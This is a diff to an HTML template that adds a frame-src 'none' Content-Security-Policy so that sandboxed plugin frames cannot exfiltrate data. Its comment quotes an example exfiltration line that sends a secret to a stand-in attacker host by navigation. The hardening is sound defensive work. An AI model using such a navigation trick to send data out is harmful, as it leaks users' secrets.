@@ -2,6 +2,15 @@
 <html lang="%LANG_ISO_CODE%">
   <head>
     <meta charset="utf-8" />
+    <!-- A sandboxed iframe may always navigate itself, and nothing in the guest's
+         own CSP stops it; a child frame's navigation is checked against the
+         parent's frame-src. This is what keeps a plugin from exfiltrating with
+         `location.href = "https://evil.tld/?d=" + secret`. `about:srcdoc` is
+         exempt, so the plugin frame still renders, and Electron <webview> is not
+         governed by frame-src, so the in-app browser is unaffected.
+         The daemon sets the same policy as a header (packages/server/src/server/web-ui.ts);
+         this meta is what covers the Electron load. See docs/plugins.md. -->
+    <meta http-equiv="Content-Security-Policy" content="frame-src 'none'" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="robots" content="noindex,nofollow" />
     <meta name="theme-color" content="#181B1A" />
